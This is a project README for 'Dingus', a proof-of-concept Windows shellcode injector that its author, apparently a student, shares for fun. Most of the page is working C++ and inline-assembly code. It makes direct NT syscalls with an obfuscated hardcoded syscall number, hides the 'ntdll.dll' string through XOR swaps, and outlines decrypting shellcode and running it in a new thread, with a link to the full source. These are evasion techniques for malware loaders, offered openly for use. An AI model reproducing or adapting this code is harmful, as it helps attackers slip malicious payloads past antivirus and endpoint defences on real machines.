<p align="left">
  <a href="../readme.md">⬅ Back</a>
</p>

# Dingus

This is a tiny PoC shellcode injector thing I was writing for my uni research paper, decided to share it for fun.  

This shellcode payload injector PoC has some obfuscation, positional keying, raw syscalls with obfuscated yet hardcoded SSNs etc.
I think I'll be writing more of PoCs as I find it fun to write bins which are malicious in their construction.  
<br>
I used stuff from [NTinternals](http://undocumented.ntinternals.net/) to write these. The NTinternals place has some cool stuff, it documents the NT internals (duh) that Microslop wasn't very keen on documenting. You can find the full source [here](dingus.cpp).  

So basically what happens is that I:
1. Decrypt shellcode
2. Zero out the old volatile array
2. Deshuffle the NTDLL.dll stuff to get the modulehandle
3. ...
4. Allocate the memory with the raw NtAllocateVirtualMemory syscall thing
5. Run a thread with the decrypted shellcode
5. ...
6. Clean up, zero out memory, and NtFreeVirtualMemory syscall thing

The NT stuff I was rambling about:
```cpp
extern "C" NTSTATUS __attribute__((naked)) syscall6(ULONG syscall_number, HANDLE arg1, PVOID arg2,
     ULONG_PTR arg3, PVOID arg4, ULONG_PTR arg5, ULONG_PTR arg6) {
    __asm__ volatile(
        "movl %ecx, %eax\n\t"
        "movq %rdx, %rcx\n\t"
        "movq %r8, %rdx\n\t"
        "movq %r9, %r8\n\t"
        "movq 0x28(%rsp), %r9\n\t"
        "movq 0x30(%rsp), %r11\n\t"
        "movq %r11, 0x28(%rsp)\n\t"
        "movq 0x38(%rsp), %r11\n\t"
        "movq %r11, 0x30(%rsp)\n\t"
        "movq %rcx, %r10\n\t"
        "syscall\n\t"
        "ret\n\t"
    );
}

extern "C" NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
     PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    return syscall6(
        getAlloc(),
        ProcessHandle,
        BaseAddress,
        ZeroBits,
        RegionSize,
        AllocationType,
        Protect
    );
}
```

Some simple string obfuscation:
```cpp
// #define _ntdll "tnldl"
__attribute__((__noinline__)) const char* dllNt(char* ptr) {
    ptr[0] = ptr[1] ^ ptr[0];
    ptr[1] = ptr[0] ^ ptr[1];
    ptr[0] = ptr[1] ^ ptr[0];
    
    ptr[2] = ptr[3] ^ ptr[2];
    ptr[3] = ptr[2] ^ ptr[3];
    ptr[2] = ptr[3] ^ ptr[2];

    ptr[5] = '.';
    
    ptr[6] = ptr[2];
    ptr[7] = ptr[4];
    ptr[8] = ptr[3];

    ptr[9] = '\0';

    return ptr;
}
```

Some simple in obfuscation:
```cpp
__attribute__((__noinline__)) int getAlloc() {
    volatile int x = 0x10;
    volatile int y = 0x08;
    return x + y;
}
```

<p align="left">
  <a href="../readme.md">⬅ Back</a>
</p>